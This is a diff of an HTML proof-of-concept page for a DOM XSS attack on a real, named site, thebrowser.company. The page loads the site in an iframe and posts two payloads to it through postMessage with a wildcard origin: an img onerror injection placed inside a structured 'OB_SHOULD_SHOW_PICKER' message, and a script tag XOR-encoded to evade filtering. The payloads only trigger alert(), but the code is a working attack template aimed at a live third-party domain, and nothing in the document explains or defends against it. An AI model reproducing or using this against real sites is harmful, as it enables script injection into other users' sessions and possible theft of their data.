@@ -2,46 +2,42 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>💥 DOM XSS Exploit – thebrowser.company</title>
+  <title>✅ DOM XSS PoC – thebrowser.company</title>
 </head>
 <body>
-  <h2>✅ DOM XSS PoC – Hybrid Payloads</h2>
-  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:2px solid green;"></iframe>
+  <h2>✅ PoC: DOM XSS via postMessage (final test)</h2>
+  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:2px solid #0f0;"></iframe>
 
   <script>
-    function xorEncode(str, key = 0x66) {
-      const keyHex = key.toString(16).padStart(2, '0');
-      return keyHex + Array.from(str).map(c =>
-        (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
-      ).join('');
-    }
-
-    const payloadXOR = xorEncode("<script>alert('XSS via XOR')</script>");
-
-    const structuredPayload = {
-      message: "OB_SHOULD_SHOW_PICKER",
-      content: {
-        marketerId: [
-          `<img src="x" onerror="alert('XSS via object')">`
-        ]
-      }
-    };
-
     const iframe = document.getElementById("target");
 
     iframe.onload = () => {
       console.log("✅ iframe loaded");
 
-      try {
-        // Send both payload types
-        iframe.contentWindow.postMessage(structuredPayload, "*");
-        console.log("🚀 Structured object postMessage sent.");
+      // 1. Structured payload (used in internal messaging)
+      const structuredPayload = {
+        message: "OB_SHOULD_SHOW_PICKER",
+        content: {
+          marketerId: [
+            `<img src=x onerror=alert('XSS')>`
+          ]
+        }
+      };
 
-        iframe.contentWindow.postMessage(payloadXOR, "*");
-        console.log("🚀 XOR payload sent.");
-      } catch (e) {
-        console.error("❌ Error sending payloads:", e);
+      // 2. XOR payload (if decoder is active)
+      function xorEncode(str, key = 0x66) {
+        const keyHex = key.toString(16).padStart(2, '0');
+        return keyHex + Array.from(str).map(c =>
+          (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
+        ).join('');
       }
+
+      const xorPayload = xorEncode("<script>alert('XSS from XOR')</script>");
+
+      // ✅ Send both payloads
+      iframe.contentWindow.postMessage(structuredPayload, "*");
+      iframe.contentWindow.postMessage(xorPayload, "*");
+      console.log("🚀 Payloads sent via postMessage");
     };
   </script>
 </body>
